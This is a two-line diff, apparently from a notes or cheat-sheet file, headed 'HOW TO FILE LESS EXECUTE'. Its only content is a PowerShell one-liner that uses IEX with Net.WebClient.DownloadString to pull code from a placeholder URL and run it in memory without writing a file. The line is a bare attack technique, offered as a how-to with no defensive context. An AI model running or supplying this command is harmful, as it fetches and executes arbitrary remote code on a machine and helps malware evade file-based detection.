@@ -1,0 +1,2 @@
+# HOW TO FILE LESS EXECUTE
+IEX(New-Object Net.WebClient).DownloadString(' THE RAW URL FOR THE FILE')
